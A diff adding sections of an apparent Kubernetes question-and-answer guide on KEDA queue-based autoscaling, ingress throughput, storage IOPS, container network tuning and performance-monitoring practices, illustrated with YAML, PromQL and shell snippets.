+            periodSeconds: 60   # Max 5 new pods/min
+```
+
+**Consideration 4: Connection management**
+
+Each pod opens connections (DB, broker). Many pods × many connections = problems.
+
+Mitigation:
+- Smaller per-pod connection pools
+- Connection poolers
+- Reduce concurrent consumers
+
+**Consideration 5: Idempotency**
+
+When scaling, messages might be processed by different consumers (after rebalance, retries). Processing must be idempotent.
+
+**Consideration 6: Partition ratios (Kafka specifics)**
+
+Consumers in a group can each hold multiple partitions. Adding/removing consumers triggers rebalance:
+
+- Pause during rebalance (~10s)
+- Increased lag temporarily
+- Consumers must handle rebalance events
+
+Use cooperative rebalancing if possible (avoids full pause):
+
+```yaml
+config:
+  partition.assignment.strategy: org.apache.kafka.clients.consumer.CooperativeStickyAssignor
+```
+
+**Common patterns:**
+
+**Pattern 1: Burst processing**
+
+Periodic bursts (hourly, daily):
+
+```yaml
+minReplicaCount: 0
+maxReplicaCount: 100
+triggers:
+  - type: aws-sqs-queue
+    metadata:
+      queueLength: '5'        # Aggressive scaling
+```
+
+Spawns many pods quickly for burst, scales to 0 after.
+
+**Pattern 2: Continuous stream**
+
+Steady but variable rate:
+
+```yaml
+minReplicaCount: 5   # Always available
+maxReplicaCount: 50
+triggers:
+  - type: kafka
+    metadata:
+      lagThreshold: '1000'
+```
+
+Maintains base capacity, scales up for spikes.
+
+**Pattern 3: Multi-tier**
+
+Multiple queues with different priorities:
+
+```yaml
+# High priority workers:
+spec:
+  triggers:
+    - type: aws-sqs-queue
+      metadata:
+        queueURL: ...high-priority-queue
+        queueLength: '5'        # Aggressive
+
+---
+
+# Low priority workers:
+spec:
+  triggers:
+    - type: aws-sqs-queue
+      metadata:
+        queueURL: ...low-priority-queue
+        queueLength: '50'       # Conservative
+```
+
+High-priority queue gets more capacity per message.
+
+**Pattern 4: Combined triggers**
+
+Scale based on multiple signals:
+
+```yaml
+triggers:
+  - type: aws-sqs-queue
+    metadata:
+      queueLength: '10'
+  - type: cpu
+    metadata:
+      type: Utilization
+      value: '70'
+```
+
+Scales on whichever metric needs more pods.
+
+**Monitoring queue-based scaling:**
+
+```promql
+# Current replicas:
+kube_horizontalpodautoscaler_status_current_replicas{horizontalpodautoscaler=~"keda-.*"}
+
+# Queue depth metrics (varies by source):
+# Kafka consumer lag:
+kafka_consumer_lag_sum
+
+# SQS visible messages:
+aws_sqs_approximate_number_of_messages_visible
+
+# Processing rate:
+rate(messages_processed_total[5m])
+```
+
+Alerts:
+- Queue depth growing despite scaling (max replicas hit)
+- Lag persistently high
+- Replicas at max for extended periods
+
+**Job-based scaling (ScaledJob):**
+
+For one-message-per-pod processing:
+
+```yaml
+apiVersion: keda.sh/v1alpha1
+kind: ScaledJob
+metadata:
+  name: image-processor
+spec:
+  jobTargetRef:
+    parallelism: 1
+    completions: 1
+    template:
+      spec:
+        containers:
+          - name: processor
+            image: my-processor:v1
+  maxReplicaCount: 100
+  triggers:
+    - type: aws-sqs-queue
+      metadata:
+        queueURL: ...
+        queueLength: '1'
+```
+
+Each message triggers a Job. Useful for:
+- Long-running tasks
+- Tasks needing isolation
+- Per-task retry logic
+
+**Cost optimization:**
+
+Queue-based scaling enables significant cost savings:
+
+- Scale to 0 during quiet periods
+- Pay only for processing time
+- Right-sized infrastructure for actual load
+
+For batch workloads, this can be 70-90% cost savings vs. always-on.
+
+**Production scenarios:**
+
+1. **Image processing pipeline**: User uploads → SQS → KEDA scales workers. Peak 50 workers, off-hours 0. Processed 10k images/day. Cost: $200/month vs $2000 always-on.
+
+2. **Kafka consumer auto-scaling**: News article processing. Lag of 10k messages would build during peaks. KEDA scaled consumers from 5 to 50. Caught up in 5 minutes. Cost-effective.
+
+3. **RabbitMQ webhook processing**: Webhooks dispatched to RabbitMQ. KEDA scaled processors based on queue depth. Smooth handling of 10x normal load during Black Friday.
+
+4. **Multi-tier priority queues**: 3 queues (urgent, normal, batch). 3 KEDA ScaledObjects with different thresholds. Urgent always responsive (high priority resources), batch scaled to 0 off-hours.
+
+5. **Cold start mitigation**: Initially used minReplicaCount=0. First message after quiet period took 90s. Customers complained. Set minReplicaCount=2 for latency-sensitive workloads.
+
+---
+
+## 206. How do you optimize ingress throughput?
+
+Ingress is the entry point for external traffic. Throughput limitations here become user-facing latency. Optimization is multi-layered.
+
+**Throughput factors:**
+
+- **TLS termination**: CPU-intensive
+- **HTTP parsing**: per-request overhead
+- **Connection management**: keep-alive, pooling
+- **Upstream routing**: kube-proxy/iptables
+- **Backend processing**: ultimate bottleneck
+
+**Optimization 1: Replicate ingress controllers**
+
+Single replica = bottleneck. Run multiple:
+
+```yaml
+spec:
+  replicas: 5
+  template:
+    spec:
+      topologySpreadConstraints:
+        - maxSkew: 1
+          topologyKey: topology.kubernetes.io/zone
+          whenUnsatisfiable: DoNotSchedule
+          labelSelector:
+            matchLabels:
+              app: ingress-nginx
+```
+
+5+ replicas across AZs. Cloud LB distributes traffic.
+
+**Optimization 2: Generous resource allocation**
+
+```yaml
+resources:
+  requests:
+    cpu: 1000m
+    memory: 1Gi
+  limits:
+    cpu: 4000m
+    memory: 4Gi
+```
+
+Don't starve the ingress controller. TLS handshakes especially need CPU.
+
+**Optimization 3: HPA for ingress**
+
+```yaml
+apiVersion: autoscaling/v2
+kind: HorizontalPodAutoscaler
+spec:
+  minReplicas: 5
+  maxReplicas: 30
+  scaleTargetRef:
+    apiVersion: apps/v1
+    kind: Deployment
+    name: ingress-nginx-controller
+  metrics:
+    - type: Resource
+      resource:
+        name: cpu
+        target:
+          type: Utilization
+          averageUtilization: 60
+```
+
+Auto-scales with load.
+
+**Optimization 4: NGINX tuning**
+
+For NGINX Ingress:
+
+```yaml
+data:
+  # Worker processes:
+  worker-processes: "auto"   # = number of CPUs
+  
+  # Connections per worker:
+  max-worker-connections: "65536"
+  
+  # Open files:
+  max-worker-open-files: "65536"
+  
+  # Keep-alive:
+  keep-alive: "75"
+  keep-alive-requests: "10000"
+  upstream-keepalive-connections: "320"
+  upstream-keepalive-requests: "10000"
+  
+  # Buffer sizes:
+  proxy-buffer-size: "16k"
+  proxy-buffers-number: "8"
+  
+  # Compression:
+  use-gzip: "true"
+  gzip-level: "5"
+```
+
+These significantly improve throughput.
+
+**Optimization 5: HTTP/2 support**
+
+```yaml
+data:
+  use-http2: "true"
+```
+
+HTTP/2 multiplexes requests over single connection:
+- Fewer handshakes
+- Lower latency
+- Better throughput for many concurrent requests
+
+**Optimization 6: Connection limits**
+
+OS-level limits:
+
+```yaml
+# On nodes:
+sysctl -w net.core.somaxconn=65535
+sysctl -w net.ipv4.tcp_max_syn_backlog=65535
+```
+
+Container limits:
+
+```yaml
+# Ingress container:
+securityContext:
+  sysctls:
+    - name: net.core.somaxconn
+      value: "65535"
+```
+
+**Optimization 7: Use DaemonSet for max throughput**
+
+```yaml
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: ingress-nginx
+spec:
+  template:
+    spec:
+      hostNetwork: true   # Use host's network
+      hostPort: 80
+```
+
+DaemonSet:
+- One ingress controller per node
+- Bypasses kube-proxy overhead
+- Maximum scalability
+
+Trade-off: more resources used.
+
+**Optimization 8: Topology-aware traffic**
+
+```yaml
+metadata:
+  annotations:
+    service.kubernetes.io/topology-mode: Auto
+```
+
+Routes ingress to same-zone backends. Reduces cross-AZ latency.
+
+**Optimization 9: Offload TLS to LB**
+
+Terminate TLS at cloud LB instead of ingress:
+
+```yaml
+# AWS ALB Ingress:
+apiVersion: networking.k8s.io/v1
+kind: Ingress
+metadata:
+  annotations:
+    alb.ingress.kubernetes.io/listen-ports: '[{"HTTPS":443}]'
+    alb.ingress.kubernetes.io/certificate-arn: arn:aws:acm:...
+```
+
+Ingress sees plain HTTP, no TLS overhead. ALB handles TLS.
+
+**Optimization 10: Connection pooling to upstreams**
+
+```yaml
+data:
+  upstream-keepalive-connections: "1000"
+  upstream-keepalive-requests: "10000"
+```
+
+Reuse connections to backend pods. Avoid setup overhead per request.
+
+**Optimization 11: Reduce reload frequency**
+
+NGINX reloads on every Ingress change. With many changes, much CPU spent reloading:
+
+```yaml
+data:
+  worker-shutdown-timeout: "30s"
+```
+
+Or use Envoy-based controllers (Contour, Emissary) that hot-reload without restart.
+
+**Optimization 12: Disable unused features**
+
+```yaml
+data:
+  # If not using:
+  enable-modsecurity: "false"
+  enable-owasp-modsecurity-crs: "false"
+  enable-opentracing: "false"
+```
+
+Each feature adds overhead.
+
+**Cloud-specific optimizations:**
+
+**AWS:**
+
+```yaml
+# Use NLB instead of CLB (Classic LB):
+apiVersion: v1
+kind: Service
+metadata:
+  annotations:
+    service.beta.kubernetes.io/aws-load-balancer-type: "nlb"
+    service.beta.kubernetes.io/aws-load-balancer-cross-zone-load-balancing-enabled: "true"
+```
+
+NLB: better throughput, lower latency.
+
+**GCP:**
+
+Use GLBs (Global Load Balancers) for distributed traffic.
+
+**Azure:**
+
+Use Standard SKU for better performance.
+
+**Different controllers compared:**
+
+**NGINX Ingress:**
+- Mature, well-known
+- Good performance
+- Config reloads can be slow
+
+**Traefik:**
+- Modern, automatic discovery
+- Good performance
+- Easier configuration
+
+**HAProxy Ingress:**
+- High performance
+- Battle-tested
+- More complex
+
+**Envoy-based (Contour, Emissary):**
+- Modern proxy
+- Hot reload (no restart)
+- Native gRPC support
+- Higher complexity
+
+**Cloud-native (ALB Ingress, GLB Ingress):**
+- Offload to cloud LB
+- Auto-scaling
+- Less in-cluster resources
+
+**Benchmark before/after:**
+
+```bash
+# wrk for HTTP benchmarking:
+wrk -t12 -c400 -d30s --latency https://my-service.example.com/
+
+# Output:
+# Running 30s test @ https://my-service.example.com/
+#   12 threads and 400 connections
+#   Thread Stats   Avg      Stdev     Max   +/- Stdev
+#     Latency    50.00ms   10.00ms   100.00ms   80.00%
+#     Req/Sec     833.33    100.00    1000.00    75.00%
+#   Latency Distribution
+#      50%   50.00ms
+#      75%   60.00ms
+#      90%   80.00ms
+#      99%   100.00ms
+#   299988 requests in 30s, 50MB read
+# Requests/sec: 10000.00
+```
+
+Run before and after each optimization to measure impact.
+
+**Common pitfalls:**
+
+**Pitfall 1: Single ingress replica**
+
+All traffic through one pod. Doesn't scale.
+
+**Pitfall 2: TLS at ingress + at backend**
+
+Double TLS overhead. Terminate TLS at one layer only.
+
+**Pitfall 3: No keep-alive**
+
+Each request new connection. Massive overhead.
+
+**Pitfall 4: Tiny resource limits**
+
+Ingress OOMKilled or CPU-throttled under load.
+
+**Pitfall 5: Slow config reloads**
+
+Frequent Ingress changes cause constant NGINX reloads. CPU consumed by reloads, not requests.
+
+**Production scenarios:**
+
+1. **Throughput tripled with HTTP/2**: Service made many small requests. Enabled HTTP/2 in ingress. Throughput increased 3x (multiplexed connections vs many TLS handshakes).
+
+2. **TLS offload to ALB**: Ingress controller was CPU-bound on TLS. Moved TLS to ALB. Ingress CPU dropped 60%. Throughput increased proportionally.
+
+3. **DaemonSet for max scale**: 100k req/s requirement. Deployment hit limits even with scaling. Migrated to DaemonSet + hostNetwork. Handled load with margin.
+
+4. **Reload optimization**: Cluster with 1000+ Ingresses. Each change caused reload of all configs. Migrated to Contour (Envoy-based). Hot reload eliminated downtime.
+
+5. **Connection pooling**: API gateway made many upstream calls. Tuned upstream-keepalive-connections from default 320 to 5000. Backend connection rate dropped 90%.
+
+---
+
+## 207. Explain storage IOPS bottlenecks
+
+Storage I/O Operations Per Second (IOPS) bottlenecks cause performance issues throughout the cluster. Understanding causes and solutions is critical for stateful workloads.
+
+**What is IOPS:**
+
+IOPS measures storage operations per second:
+- Reads
+- Writes
+- Mixed
+
+Different storage tiers have different IOPS limits:
+- Standard HDD: 100-200 IOPS
+- General SSD: 3,000-16,000 IOPS
+- Provisioned SSD: up to 64,000+ IOPS
+- NVMe local: 100,000+ IOPS
+
+**Where IOPS matter:**
+
+**Use case 1: Databases**
+
+PostgreSQL, MySQL, MongoDB:
+- WAL/log writes (sustained writes)
+- Query reads (random reads)
+- Compaction (mixed)
+
+10,000 transactions/sec might need 30,000+ IOPS.
+
+**Use case 2: Logging**
+
+Heavy log writing:
+- Application logs to disk
+- Kubelet log management
+- Container logs
+
+A high-traffic node can generate 10,000+ log IOPS.
+
+**Use case 3: Message brokers**
+
+Kafka, RabbitMQ:
+- Persistent log writes
+- Index updates
+
+**Use case 4: etcd**
+
+Highly sensitive to disk IOPS:
+- WAL fsync (every transaction)
+- Snapshot writes
+- Compaction
+
+**Use case 5: Container image pulls**
+
+When many pods start:
+- Image layer writes
+- Decompression
+- Multiple parallel pulls
+
+**Symptoms of IOPS bottleneck:**
+
+**Symptom 1: High latency on disk operations**
+
+```bash
+iostat -x 1
+
+# Look at:
+# %util: should be < 80%
+# await: should be low (< 10ms)
+# r_await, w_await: read/write latency
+```
+
+If %util at 100% and await high, IOPS bottleneck.
+
+**Symptom 2: Application latency**
+
+Apps doing I/O become slow. Database queries that were 10ms now 200ms.
+
+**Symptom 3: etcd issues**
+
+```promql
+histogram_quantile(0.99, rate(etcd_disk_wal_fsync_duration_seconds_bucket[5m]))
+# Should be < 10ms; high values indicate IOPS issue
+```
+
+**Symptom 4: kubelet PLEG slow**
+
+kubelet's container relisting is I/O dependent. Slow disk = PLEG slow = node NotReady.
+
+**Symptom 5: Image pull slow**
+
+New pods take long because images can't be written to disk fast enough.
+
+**Cloud storage IOPS specifics:**
+
+**AWS EBS:**
+
+```
+gp2 (older general purpose):
+- 3 IOPS per GB baseline
+- Burst to 3000 IOPS (with credits)
+- Credits replenish when usage < baseline
+
+gp3 (newer general purpose):
+- 3000 IOPS baseline (regardless of size)
+- Up to 16,000 IOPS provisioned
+- No burst credit concept
+
+io1/io2 (provisioned IOPS):
+- Up to 64,000 IOPS
+- Higher cost
+- Predictable performance
+```
+
+Common gotcha: gp2 burst credits exhaust during sustained load. Performance drops to baseline.
+
+**GCP Persistent Disks:**
+
+```
+Standard PD: limited IOPS
+SSD PD: up to 30 IOPS/GB read, 30 IOPS/GB write
+Extreme PD: very high IOPS, expensive
+```
+
+**Azure:**
+
+```
+Standard SSD: limited
+Premium SSD: better
+Ultra SSD: highest tier
+```
+
+**Local NVMe:**
+
+Bare-metal-equivalent IOPS. Caveat: not persistent across instance restart on most clouds.
+
+**Diagnosing IOPS bottleneck:**
+
+**Step 1: Check OS-level metrics**
+
+```bash
+# On the node:
+iostat -x 1 10
+
+# Look for:
+# %util = 100% (disk maxed)
+# avgqu-sz high (queue building)
+# await high (latency)
+```
+
+**Step 2: Check application-specific metrics**
+
+For databases:
+
+```sql
+-- PostgreSQL: slow queries due to I/O
+SELECT query, calls, total_time, mean_time
+FROM pg_stat_statements
+ORDER BY total_time DESC
+LIMIT 10;
+```
+
+For etcd:
+
+```promql
+etcd_disk_wal_fsync_duration_seconds   # Should be <10ms
+etcd_disk_backend_commit_duration_seconds
+```
+
+**Step 3: Compare to disk specs**
+
+Is current IOPS near the disk's limit?
+
+```bash
+# Sum read+write IOPS:
+iostat -x 1 | awk '/sda/ {print $4+$5}'
+```
+
+If close to disk's max, you've hit the limit.
+
+**Mitigation strategies:**
+
+**Strategy 1: Upgrade disk tier**
+
+Most direct: faster disk.
+
+```yaml
+# Migrate StorageClass:
+apiVersion: storage.k8s.io/v1
+kind: StorageClass
+metadata:
+  name: fast
+parameters:
+  type: gp3   # Or io2 for higher IOPS
+  iops: "10000"
+  throughput: "500"
+```
+
+**Strategy 2: Use provisioned IOPS**
+
+```yaml
+parameters:
+  type: io2
+  iops: "20000"
+```
+
+Pay for guaranteed IOPS. No burst credit issues.
+
+**Strategy 3: Distribute load across disks**
+
+```yaml
+# StatefulSet with multiple PVCs:
+volumeClaimTemplates:
+  - metadata:
+      name: data
+    spec:
+      storageClassName: fast
+      resources:
+        requests:
+          storage: 100Gi
+  - metadata:
+      name: logs
+    spec:
+      storageClassName: fast
+      resources:
+        requests:
+          storage: 50Gi
+```
+
+Database data and logs on separate disks. Combined IOPS available.
+
+**Strategy 4: Memory caching**
+
+Reduce reads via cache:
+
+```sql
+-- PostgreSQL: increase shared_buffers
+shared_buffers = 8GB
+```
+
+More data in memory = fewer disk reads.
+
+For applications: cache layer (Redis) reduces DB IOPS.
+
+**Strategy 5: Batch writes**
+
+Many small writes = high IOPS.
+
+Few large writes = low IOPS.
+
+Batch writes where possible:
+- Application-level batching
+- Database WAL settings
+- Kafka log segment size
+
+**Strategy 6: Tune fsync behavior**
+
+```yaml
+# PostgreSQL:
+synchronous_commit = off   # Risk data loss for performance
+```
+
+Risky but reduces IOPS dramatically.
+
+**Strategy 7: Local NVMe for cache**
+
+Use local NVMe (not persistent) for read cache:
+
+```yaml
+# Pod with local storage:
+volumes:
+  - name: cache
+    emptyDir:
+      medium: ""   # Disk-backed
+```
+
+Cache rebuilt on pod restart, but very fast IOPS.
+
+**Strategy 8: Tiered storage**
+
+Hot data on fast disk, cold on slow:
+
+```yaml
+# Hot data:
+storageClassName: io2
+
+# Cold data:
+storageClassName: standard
+```
+
+Move data between tiers based on access patterns.
+
+**Strategy 9: Spread workloads**
+
+Heavy I/O workloads on dedicated nodes:
+
+```yaml
+nodeSelector:
+  workload: io-intensive
+```
+
+Avoid noisy neighbors.
+
+**Strategy 10: Optimize at the application level**
+
+- Database indexes (reduce table scans)
+- Query optimization
+- Connection pooling
+- Read replicas
+
+**Production scenarios:**
+
+1. **gp2 burst credits exhausted**: etcd disk credits ran out during heavy day. fsync went from 5ms to 500ms. Cluster became unresponsive. Migrated to gp3 (no burst concept). Resolved.
+
+2. **PostgreSQL log disk bottleneck**: WAL on same disk as data. Heavy writes saturated disk. Database queries slow. Moved WAL to separate disk. Throughput doubled.
+
+3. **Kafka high IOPS requirement**: Kafka brokers needed 50k IOPS. gp3 maxed at 16k. Switched to io2 with provisioned IOPS. Achievable.
+
+4. **Image pull storm**: 200 pods starting simultaneously. Image pulls saturated disk on each node. Slow startups. Implemented image pre-pulling on quiet times. New pod starts fast.
+
+5. **Local NVMe for analytics**: Analytics workload doing many scans. Network storage too slow. Used local NVMe (no persistence, used for cache only). Performance improved 10x.
+
+---
+
+## 208. How do you tune container networking?
+
+Container networking has many layers, each with its own tuning options. Optimization improves throughput, latency, and pod density.
+
+**Network stack layers:**
+
+1. Pod's network namespace
+2. Veth pair (pod to host bridge)
+3. Host network stack
+4. CNI plugin
+5. Physical NIC
+6. Network infrastructure
+
+**Tuning at each layer:**
+
+**Layer 1: Pod-level**
+
+**Optimization: hostNetwork**
+
+```yaml
+spec:
+  hostNetwork: true
+```
+
+Pod uses host's network namespace directly:
+- Skip pod network entirely
+- Lowest latency
+- Loses pod IP isolation
+- Loses Service routing
+
+Use only for performance-critical apps (load balancers, latency-sensitive services).
+
+**Optimization: hostPort**
+
+```yaml
+ports:
+  - containerPort: 8080
+    hostPort: 8080
+```
+
+Bind to specific host port. No NAT through kube-proxy.
+
+**Layer 2: Veth tuning**
+
+Veth pairs connect pod to host. Mostly automatic, some tuning:
+
+```bash
+# Disable TX offload if it causes issues:
+ethtool -K veth0 tx off
+```
+
+Rarely needed; defaults usually fine.
+
+**Layer 3: Host kernel**
+
+**Conntrack table:**
+
+```bash
+# Check usage:
+sysctl net.netfilter.nf_conntrack_count
+sysctl net.netfilter.nf_conntrack_max
+
+# Increase if approaching limit:
+sysctl -w net.netfilter.nf_conntrack_max=1048576
+```
+
+**Socket buffers:**
+
+```bash
+# Larger buffers for high-throughput:
+sysctl -w net.core.rmem_max=134217728
+sysctl -w net.core.wmem_max=134217728
+sysctl -w net.ipv4.tcp_rmem="4096 87380 134217728"
+sysctl -w net.ipv4.tcp_wmem="4096 65536 134217728"
+```
+
+**TCP tuning:**
+
+```bash
+# Faster TCP:
+sysctl -w net.ipv4.tcp_congestion_control=bbr
+sysctl -w net.ipv4.tcp_window_scaling=1
+sysctl -w net.ipv4.tcp_sack=1
+sysctl -w net.ipv4.tcp_timestamps=1
+sysctl -w net.ipv4.tcp_fastopen=3
+```
+
+**MTU:**
+
+```bash
+# Check interface MTU:
+ip link show eth0
+
+# For high throughput, use jumbo frames (within VPC):
+ip link set dev eth0 mtu 9000
+```
+
+**Layer 4: CNI plugin tuning**
+
+**Cilium:**
+
+```yaml
+spec:
+  # Use eBPF (faster than iptables):
+  enableBPF: true
+  
+  # Direct routing:
+  routingMode: native
+  
+  # Bandwidth manager:
+  bandwidthManager:
+    enabled: true
+```
+
+**Calico:**
+
+```yaml
+spec:
+  # eBPF dataplane:
+  bpfEnabled: true
+  
+  # Or, iptables nftables backend:
+  iptablesBackend: nft
+  
+  # MTU:
+  mtu: 9000
+```
+
+**AWS VPC CNI:**
+
+```yaml
+env:
+  - name: ENABLE_PREFIX_DELEGATION
+    value: "true"
+  - name: WARM_PREFIX_TARGET
+    value: "1"
+```
+
+More IPs per ENI, less ENI overhead.
+
+**Layer 5: kube-proxy**
+
+**Use IPVS mode for large clusters:**
+
+```yaml
+# kube-proxy config:
+mode: ipvs
+ipvs:
+  scheduler: rr
+```
+
+Better than iptables for many services.
+
+**Or use eBPF kube-proxy replacement:**
+
+```yaml
+# Cilium can replace kube-proxy:
+spec:
+  kubeProxyReplacement: strict
+```
+
+eBPF-based service handling. Significant performance improvement.
+
+**Service-level optimizations:**
+
+**externalTrafficPolicy: Local**
+
+```yaml
+spec:
+  externalTrafficPolicy: Local
+```
+
+- Preserves source IP
+- Avoids cross-node hop
+- Drops traffic to nodes without endpoints
+
+**Topology-aware routing:**
+
+```yaml
+metadata:
+  annotations:
+    service.kubernetes.io/topology-mode: Auto
+```
+
+Prefer same-zone endpoints. Reduces cross-AZ latency.
+
+**Application-level tuning:**
+
+**Connection pooling:**
+
+```python
+# HTTP connection pooling:
+import urllib3
+http = urllib3.PoolManager(maxsize=20)
+
+# DB connection pooling:
+# (use connection pool libraries)
+```
+
+**Keep-alive:**
+
+```python
+# HTTP keep-alive:
+session = requests.Session()
+session.headers.update({'Connection': 'keep-alive'})
+```
+
+Reuse TCP connections, avoid handshake overhead.
+
+**HTTP/2:**
+
+```yaml
+# Server config:
+http2: true
+```
+
+Multiplexes requests over single connection.
+
+**Async I/O:**
+
+Non-blocking I/O for high concurrency:
+
+```python
+# Python: asyncio, aiohttp
+# Node.js: async by default
+# Go: goroutines
+```
+
+**Network performance testing:**
+
+**iperf3:**
+
+```bash
+# Server pod:
+kubectl run iperf-server --image=networkstatic/iperf3 -- iperf3 -s
+
+# Client:
+kubectl run iperf-client --rm -it --image=networkstatic/iperf3 -- \
+  iperf3 -c <server-ip> -P 4 -t 60
+
+# Output shows bandwidth, retransmits
+```
+
+**Network latency:**
+
+```bash
+# Ping pod-to-pod:
+kubectl exec -it client-pod -- ping -c 100 <target-pod-ip>
+
+# Detailed packet analysis:
+kubectl exec -it client-pod -- tcpdump -i eth0
+```
+
+**Throughput troubleshooting:**
+
+If throughput is lower than expected:
+
+**Check 1: NIC saturation**
+
+```bash
+sar -n DEV 1
+# Look at txkB/s, rxkB/s
+# Compare to NIC max speed
+```
+
+**Check 2: TCP retransmits**
+
+```bash
+netstat -s | grep retrans
+# Many retransmits = packet loss
+```
+
+**Check 3: Conntrack**
+
+```bash
+# Conntrack near max = drops
+sysctl net.netfilter.nf_conntrack_count
+sysctl net.netfilter.nf_conntrack_max
+```
+
+**Check 4: Interrupt handling**
+
+```bash
+# Are interrupts balanced across CPUs?
+cat /proc/interrupts | grep eth0
+```
+
+If one CPU handling all interrupts, that CPU is bottleneck:
+
+```bash
+# Enable IRQ balance:
+systemctl start irqbalance
+```
+
+**Common networking issues:**
+
+**Issue 1: MTU mismatch**
+
+Encapsulation (VXLAN, IPIP) reduces effective MTU. If pod MTU = node MTU, fragmentation occurs:
+
+```yaml
+# Set pod MTU = node MTU - encapsulation overhead
+# For VXLAN: 50 bytes overhead
+# Pod MTU: 1450 (if node MTU 1500)
+```
+
+**Issue 2: Conntrack exhaustion**
+
+Many connections fill conntrack table:
+
+```bash
+dmesg | grep "nf_conntrack: table full"
+```
+
+Increase or reduce conntrack timeout:
+
+```bash
+sysctl -w net.netfilter.nf_conntrack_tcp_timeout_established=300
+```
+
+**Issue 3: Cross-AZ chatty services**
+
+Service-to-service across AZs slow + expensive.
+
+Fix: topology-aware routing.
+
+**Issue 4: kube-proxy overhead at scale**
+
+iptables rule processing slows with many services.
+
+Fix: IPVS mode or eBPF (Cilium replacement).
+
+**Production scenarios:**
+
+1. **BBR vs cubic**: Switched TCP congestion to BBR. Cross-region throughput improved 40%. Better congestion handling.
+
+2. **Cilium eBPF replaced kube-proxy**: 5000 services, iptables slow. Migrated to Cilium with eBPF. Service resolution latency dropped 80%.
+
+3. **MTU 9000 in same VPC**: Pod-to-pod traffic mostly intra-region. Jumbo frames reduced packets by ~6x. Higher throughput, less CPU.
+
+4. **Conntrack exhaustion fix**: High-traffic ingress hit conntrack limit. Connections dropped. Increased nf_conntrack_max to 2M, tuned timeouts. Resolved.
+
+5. **Topology-aware routing**: Microservices made many cross-AZ calls. Costly and slow. Enabled topology-aware routing. 90% of traffic same-zone. AZ transfer costs dropped, latency improved.
+
+---
+
+## 209. Explain performance monitoring best practices
+
+Performance monitoring is foundational for operating Kubernetes. Best practices ensure you can detect, diagnose, and resolve issues quickly.
+
+**The four golden signals:**
+
+For every service, monitor:
+
+1. **Latency**: time to serve requests
+2. **Traffic**: requests per second
+3. **Errors**: failure rate
+4. **Saturation**: how full your service is (CPU, memory, queue depth)
+
+These form the basis of SRE monitoring.
+
+**Layers to monitor:**
+
+**Layer 1: Infrastructure**
+
+- Node CPU, memory, disk, network
+- VM/instance health
+- Network connectivity
+
+**Layer 2: Kubernetes**
+
+- API server latency
+- Scheduler health
+- etcd performance
+- Pod/node status
+
+**Layer 3: Container**
+
+- CPU usage vs request/limit
+- Memory usage
+- Network and disk I/O
+- Restart counts
+
+**Layer 4: Application**
+
+- Application-specific metrics (RPS, error rate, latency)
+- Business metrics
+
+**Layer 5: External dependencies**
+
+- Database performance
+- External API latency
+- Third-party service health
+
+**The RED method:**
+
+For request-driven services:
+
+- **Rate**: requests per second
+- **Errors**: failure rate
+- **Duration**: latency
+
+Simpler than golden signals, useful for services.
+
+**The USE method:**
+
+For resources:
+
+- **Utilization**: % of time resource was busy
+- **Saturation**: queue depth, waiting time
+- **Errors**: error count
+
+Useful for system resources (CPU, disk, network).
+
+**Best practices:**
+
+**Practice 1: Standardize instrumentation**
+
+All services emit consistent metrics:
+
+```python
+# Standard metrics in every service:
+- request_count_total (counter, labels: method, path, status)
+- request_duration_seconds (histogram)
+- in_flight_requests (gauge)
+- application_info (info)
+```
+
+Standardization enables cross-service dashboards.
+
+**Practice 2: Use OpenTelemetry**
+
+OpenTelemetry: unified instrumentation:
+
+```python
+from opentelemetry import metrics, trace
+
+meter = metrics.get_meter(__name__)
+counter = meter.create_counter("requests_total")
+
+tracer = trace.get_tracer(__name__)
+with tracer.start_as_current_span("operation"):
+    # work
+```
+
+Vendor-neutral. Supports metrics, traces, logs.
+
+**Practice 3: Distinguish symptom and cause**
+
+Monitor both:
+
+- **Symptoms**: what users experience (latency, errors)
+- **Causes**: what's happening internally (CPU, GC, queue)
+
+Symptom alerts wake you up. Cause metrics help debug.
+
+**Practice 4: Multi-window, multi-burn-rate alerts**
+
+Don't alert on single-minute spikes. Use:
+
+```yaml
+# 5-min window for fast issues:
+- alert: HighErrorRate5m
+  expr: rate(errors[5m]) / rate(requests[5m]) > 0.05
+  for: 5m
+
+# 1-hour window for slow issues:
+- alert: HighErrorRate1h
+  expr: rate(errors[1h]) / rate(requests[1h]) > 0.01
+  for: 1h
+```
+
+Multiple windows catch both acute and chronic issues.
+
+**Practice 5: SLO-based alerting**
+
+Alert on error budget consumption:
+
+```yaml
+# SLO: 99.9% availability
+# Error budget: 0.1% errors
+
+# Burn rate: how fast budget is consumed
+- alert: ErrorBudgetBurnRate
+  expr: rate(errors[1h]) / rate(requests[1h]) > 0.001 * 14
+  # 14x burn rate = budget exhausted in <2 hours
+```
+
+Focus on user impact, not arbitrary thresholds.
+
+**Practice 6: Track SLIs (Service Level Indicators)**
+
+Quantify user-perceived service quality:
+
+- Availability: % of successful requests
+- Latency: percentile of response times
+- Throughput: successful operations per second
+
+Track over time, compare to SLO.
+
+**Practice 7: Reduce alert noise**
+
+Bad alerts:
+- Fire frequently without action needed
+- Wake people for non-issues
+- Cause alert fatigue
+
+Good alerts:
+- Actionable (clear what to do)
+- High signal-to-noise
+- Right severity
+
+Review alerts regularly, tune or remove noisy ones.
+
+**Practice 8: Correlate metrics and logs**
+
+Metric shows error spike. Logs explain what happened.
+
+Use:
+- Tracing IDs across logs and metrics
+- Tools that correlate (Grafana, Datadog)
+- Standardized log formats
+
+**Practice 9: Capacity planning**
+
+Use historical data:
+
+```promql
+# CPU growth over 3 months:
+avg_over_time(
+  sum(rate(container_cpu_usage_seconds_total[5m]))[3M:1d]
+)
+```
+
+Predict when capacity needs increase.
+
+**Practice 10: Monitor the monitoring**
+
+If monitoring fails during incident, you're blind.
+
+- HA monitoring (multiple Prometheus, Grafana replicas)
+- External heartbeat (Dead Man's Snitch)
+- Monitor monitoring component health
+
+**Specific Kubernetes metrics to monitor:**
+
+**Cluster-level:**
+
+```promql
+# Node health:
+sum(kube_node_status_condition{condition="Ready",status="true"})
+sum(kube_node_status_condition{condition="MemoryPressure",status="true"})
+
+# Pod status:
+sum(kube_pod_status_phase) by (phase)
+
+# API server:
+histogram_quantile(0.99, rate(apiserver_request_duration_seconds_bucket[5m]))
+sum(rate(apiserver_request_total[5m])) by (code)
+
+# etcd:
+histogram_quantile(0.99, rate(etcd_disk_wal_fsync_duration_seconds_bucket[5m]))
+etcd_server_has_leader
+```
+
+**Node-level:**
+
+```promql
+# Resource usage:
+sum(rate(container_cpu_usage_seconds_total[5m])) by (node)
